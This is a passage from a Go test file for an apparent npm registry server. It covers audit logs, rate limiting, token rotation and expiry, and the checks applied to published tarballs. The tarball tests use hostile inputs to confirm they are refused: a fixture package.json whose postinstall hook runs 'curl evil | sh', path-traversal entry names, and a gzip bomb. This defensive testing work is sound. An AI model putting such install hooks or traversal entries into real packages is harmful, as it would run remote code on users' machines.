		t.Fatalf("%s", r.body)
	}
}

func TestAuditLog(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*")
	stranger := e.token("stranger", "npm:read:@nope/*")
	mustStatus(t, e.publish(pub, "@acme/tool", "1.0.0"), 201)
	mustStatus(t, e.do("GET", "/npm/@acme/tool", pub, nil), 200)
	mustStatus(t, e.do("GET", "/npm/@acme/tool/-/tool-1.0.0.tgz", pub, nil), 200)
	mustStatus(t, e.do("PUT", "/npm/-/package/@acme%2ftool/dist-tags/beta", pub, []byte(`"1.0.0"`)), 200)
	mustStatus(t, e.do("GET", "/npm/@acme/tool", stranger, nil), 404)

	es, err := e.h.Audit(AuditFilter{Package: "@acme/tool"})
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, a := range es {
		if a.Addr != "127.0.0.1" || a.Time.IsZero() {
			t.Errorf("entry without address or time: %+v", a)
		}
		got = append(got, a.Action+":"+a.Token+":"+a.Version)
	}
	want := "read:stranger:,tag.set:ci:1.0.0,download:ci:1.0.0,read:ci:,publish:ci:1.0.0"
	if strings.Join(got, ",") != want {
		t.Fatalf("audit:\n got %s\nwant %s", strings.Join(got, ","), want)
	}
	if es[0].Status != 404 {
		t.Fatalf("denied read recorded as %d", es[0].Status)
	}

	// Entries older than 90 days go in the sweep.
	e.advance(91 * 24 * time.Hour)
	e.h.Sweep(t.Context())
	if es, _ := e.h.Audit(AuditFilter{Package: "@acme/tool"}); len(es) != 0 {
		t.Fatalf("old audit entries kept: %d", len(es))
	}
}

// The limiter stays bounded and fast under a flood of distinct addresses, and counts an IPv6
// host's whole /64 as one address.
func TestLimiterBounded(t *testing.T) {
	var l limiter
	now := time.Date(2026, 11, 1, 0, 0, 0, 0, time.UTC)
	start := time.Now()
	for i := 0; i < 60_000; i++ {
		l.fail(fmt.Sprintf("2001:db8:%x:%x::1", i>>16, i&0xffff), now)
	}
	if n := len(l.m); n > limiterCap || l.order.Len() != n {
		t.Fatalf("%d entries tracked, %d in order", n, l.order.Len())
	}
	if d := time.Since(start); d > 5*time.Second {
		t.Fatalf("60k failures took %v", d)
	}
	for i := 0; i < failMax; i++ {
		l.fail(fmt.Sprintf("2001:db8:ffff:1::%x", i+1), now) // one /64, many addresses
	}
	if !l.blocked("2001:db8:ffff:1::abcd", now) || l.blocked("2001:db8:ffff:2::1", now) {
		t.Fatal("IPv6 must count per /64")
	}
	if !l.blocked("2001:db8:ffff:1::abcd", now.Add(failWindow)) || l.blocked("2001:db8:ffff:1::abcd", now.Add(failWindow+time.Second)) {
		t.Fatal("window")
	}
	l.prune(now.Add(failWindow + time.Second))
	if len(l.m) != 0 || l.order.Len() != 0 {
		t.Fatalf("prune left %d", len(l.m))
	}
}

// A second package.json that npm's extractor would write over the first is refused, however
// its name is spelled.
func TestTarballPaths(t *testing.T) {
	const name, ver = "@acme/tool", "1.0.0"
	other := `{"name":"@acme/tool","version":"6.6.6","scripts":{"postinstall":"curl evil | sh"}}`
	for _, c := range []struct {
		extra []string
		ok    bool
	}{
		{nil, true},
		{[]string{"package/lib/package.json", other}, true}, // nested: a different path
		{[]string{"package/", ""}, true},
		{[]string{"package//package.json", other}, false},
		{[]string{"package/./package.json", other}, false},
		{[]string{"package\\package.json", other}, false},
		// strip: 1 drops the first raw part, even "." or "": these land nested, not on top.
		{[]string{"./package/package.json", other}, true},
		{[]string{"/package/package.json", other}, true},
		// ...and these land on top of the real package.json.
		{[]string{"./package.json", other}, false},
		{[]string{"/package.json", other}, false},
		{[]string{".//package.json", other}, false},
		{[]string{"other/package.json", other}, false},
		{[]string{"package/index.js", "1", "package/index.js", "2"}, false},
		{[]string{"package/../package.json", other}, false},
		{[]string{"package/x/../../etc", "x"}, false},
	} {
		_, err := checkTarball(tgz(t, name, ver, c.extra...), name, ver, 1<<20)
		if (err == nil) != c.ok {
			t.Errorf("%q: %v", c.extra, err)
		}
	}
	real := `{"name":"@acme/tool","version":"1.0.0"}`
	for _, c := range []struct {
		entries []string
		ok      bool
	}{
		{[]string{"./package/package.json", real}, false}, // lands at package/package.json: no top one
		{[]string{"./package/package.json", real, "/package.json", other}, false},
		{[]string{"./package.json", real}, true},
	} {
		_, err := checkTarball(tarOf(t, c.entries...), name, ver, 1<<20)
		if (err == nil) != c.ok {
			t.Errorf("%q: %v", c.entries, err)
		}
	}
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*")
	for _, second := range []string{"./package.json", "/package.json"} {
		data := tgz(t, name, ver, second, other)
		mustStatus(t, e.do("PUT", "/npm/@acme%2ftool", pub, publishDoc(name, ver, data, pubOpts{})), 400)
	}
	data := tgz(t, name, ver, "package//package.json", other)
	mustStatus(t, e.do("PUT", "/npm/@acme%2ftool", pub, publishDoc(name, ver, data, pubOpts{})), 400)
}

// A token that rotates itself keeps its expiry: only an admin can give a token more time.
func TestSelfRotationKeepsExpiry(t *testing.T) {
	e := newEnv(t)
	tok, info, err := e.h.CreateToken("short", []string{"npm:read:@acme/*"}, 48*time.Hour, Actor{})
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 5; i++ {
		e.advance(40 * time.Hour)
		r := e.do("POST", "/npm/-/clowdr/token/rotate", tok, nil)
		if r.status != 200 {
			if i == 0 {
				t.Fatalf("first rotation: %d %s", r.status, r.body)
			}
			break // expired: the chain ended
		}
		var tr TokenResponse
		json.Unmarshal(r.body, &tr)
		if !tr.Info.Expires.Equal(info.Expires) {
			t.Fatalf("self-rotation moved the expiry from %v to %v", info.Expires, tr.Info.Expires)
		}
		tok = tr.Token
	}
	mustStatus(t, e.do("GET", "/npm/-/whoami", tok, nil), 401)
	// An admin rotation renews the lifetime.
	e2 := newEnv(t)
	_, info, _ = e2.h.CreateToken("short", []string{"npm:read:@acme/*"}, 48*time.Hour, Actor{})
	e2.advance(40 * time.Hour)
	_, nt, err := e2.h.RotateToken("short", false, Actor{By: "admin:x"})
	if err != nil || !nt.Expires.Equal(e2.now.Add(48*time.Hour)) {
		t.Fatalf("admin rotation: %v %v", nt.Expires, err)
	}
}

// The login route is behind the failed-auth limiter like every other route: it cannot be used
// to test tokens without limit.
func TestLoginRouteIsRateLimited(t *testing.T) {
	e := newEnv(t)
	good := e.token("ci", "npm:read:@acme/*")
	for i := 0; i < failMax; i++ {
		mustStatus(t, e.do("PUT", "/npm/-/user/org.couchdb.user:me", "clwn_bad_bad", []byte(`{}`)), 401)
	}
	mustStatus(t, e.do("PUT", "/npm/-/user/org.couchdb.user:me", good, []byte(`{}`)), 429)
	mustStatus(t, e.do("GET", "/npm/-/whoami", good, nil), 429)
}

// Build metadata would make 1.0.0 and 1.0.0+x two different tarballs for one version.
func TestBuildMetadataRefused(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*")
	mustStatus(t, e.publish(pub, "@acme/tool", "1.0.0"), 201)
	mustStatus(t, e.publish(pub, "@acme/tool", "1.0.0+b"), 400)
	mustStatus(t, e.publish(pub, "@acme/tool", "1.1.0+b"), 400)
}

// An expired token is swept 30 days after its expiry, which frees its name.
func TestExpiredTokensSwept(t *testing.T) {
	e := newEnv(t)
	if _, _, err := e.h.CreateToken("laptop", []string{"plugins:read"}, time.Hour, Actor{}); err != nil {
		t.Fatal(err)
	}
	e.advance(time.Hour + 29*24*time.Hour)
	e.h.Sweep(t.Context())
	if ts, _ := e.st.NPMTokens(); len(ts) != 1 {
		t.Fatal("swept too early")
	}
	e.advance(24 * time.Hour)
	e.h.Sweep(t.Context())
	if ts, _ := e.st.NPMTokens(); len(ts) != 0 {
		t.Fatalf("expired token kept: %+v", ts)
	}
	if _, _, err := e.h.CreateToken("laptop", []string{"plugins:read"}, 0, Actor{}); err != nil {
		t.Fatalf("name not freed: %v", err)
	}
}

// A tarball that inflates far beyond what was sent is refused once it passes 4 × max_publish.
func TestGzipBombRefused(t *testing.T) {
	e := newEnv(t) // max_publish is 1 MiB
	pub := e.token("ci", "npm:publish:@acme/*")
	data := tgz(t, "@acme/tool", "1.0.0", "package/zeros", strings.Repeat("\x00", 5<<20))
	if len(data) > 1<<20 {
		t.Fatalf("test tarball is %d bytes", len(data))
	}
	r := e.do("PUT", "/npm/@acme%2ftool", pub, publishDoc("@acme/tool", "1.0.0", data, pubOpts{}))
	mustStatus(t, r, 400)
	if !strings.Contains(string(r.body), "unpacks to more than") {
		t.Fatalf("%s", r.body)
	}
	if got := unpackLimit(1 << 30); got != 512<<20 {
		t.Fatalf("cap: %d", got)
	}
}

// Only a few publishes read and check their bodies at once; the next one waits for a slot.
func TestPublishSlots(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*")
	slots := e.h.publishSlots()
	for i := 0; i < cap(slots); i++ {
		slots <- struct{}{}
	}
	done := make(chan int, 1)
	go func() { done <- e.publish(pub, "@acme/tool", "1.0.0").status }()
	select {
	case st := <-done:
		t.Fatalf("publish ran without a slot: %d", st)
	case <-time.After(300 * time.Millisecond):
	}
	<-slots
	select {
	case st := <-done:
		if st != 201 {
			t.Fatalf("publish after a slot freed: %d", st)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("publish never got the freed slot")
	}
}
